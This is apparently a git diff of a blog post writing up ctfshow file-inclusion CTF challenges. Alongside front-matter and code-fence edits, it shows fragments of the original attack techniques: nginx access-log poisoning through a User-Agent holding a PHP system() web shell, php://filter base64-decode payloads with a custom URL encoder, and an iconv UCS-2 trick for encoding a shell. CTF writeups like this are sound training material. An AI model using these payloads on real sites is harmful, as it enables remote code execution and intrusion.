@@ -2,18 +2,35 @@
 title: "ctfshow Web入门[文件包含] Writeup"
 date: 2022-08-04T11:32:16+08:00
 draft: false
-tags: ['ctf','php']
-categories: ['web']
 author: "X1r0z"
 
-# weight: 1  # Top page
+tags: ['ctf','php']
+categories: ['web']
 
-# You can also close(false) or open(true) something for this content.
-# P.S. comment can only be closed
-comment: false
-toc: false
-autoCollapseToc: false
+hiddenFromHomePage: false
+hiddenFromSearch: false
+twemoji: false
+lightgallery: true
+ruby: true
+fraction: true
+fontawesome: true
+linkToMarkdown: true
+rssFullText: false
+
+toc:
+  enable: true
+  auto: true
+code:
+  copy: true
+  maxShownLines: 50
+math:
+  enable: false
+share:
+  enable: true
+comment:
+  enable: true
 ---
+
 
 文件包含
 
@@ -29,7 +46,7 @@ php 伪协议
 
 ## web79
 
-```
+```php
 if(isset($_GET['file'])){
     $file = $_GET['file'];
     $file = str_replace("php", "???", $file);
@@ -53,7 +70,7 @@ if(isset($_GET['file'])){
 
 ## web80
 
-```
+```php
 $file = str_replace("php", "???", $file);
 $file = str_replace("data", "???", $file);
 ```
@@ -68,7 +85,7 @@ nginx 日志路径 `/var/log/nginx/access.log`, 更改 User-Agent
 
 ## web81
 
-```
+```php
 $file = str_replace("php", "???", $file);
 $file = str_replace("data", "???", $file);
 $file = str_replace(":", "???", $file);
@@ -90,7 +107,7 @@ User-Agent: <?php system($_GET[1]);?>
 
 ## web87
 
-```
+```php
 if(isset($_GET['file'])){
     $file = $_GET['file'];
     $content = $_POST['content'];
@@ -122,7 +139,7 @@ if(isset($_GET['file'])){
 
 网上的在线 urlencode 无法对正常字符如 `A-Z a-z .` 等进行编码, 这里我们手写一个编码器
 
-```
+```python
 text = 'php://filter/convert.base64-decode/resource=1.php'
 
 new_text = ''
@@ -149,7 +166,7 @@ print(new_text)
 
 ## web88
 
-```
+```php
 if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
         die("error");
 }
@@ -190,7 +207,7 @@ binwalk 提取失败了, 用的 foremost
 
 ## web117
 
-```
+```php
 highlight_file(__FILE__);
 error_reporting(0);
 function filter($x){
@@ -222,7 +239,7 @@ convert.iconv.<input-encoding>/<output-encoding>
 
 本地生成一个 payload, 注意原始长度必须是偶数
 
-```
+```php
 <?php 
 $text = '<?php system($_GET[11]);?>';
 
@@ -232,7 +249,7 @@ echo iconv("UCS-2LE", "UCS-2BE", $text);
 
 编码后的 payload
 
-```
+```php
 ?<hp pystsme$(G_TE1[]1;)>?
 ```
 
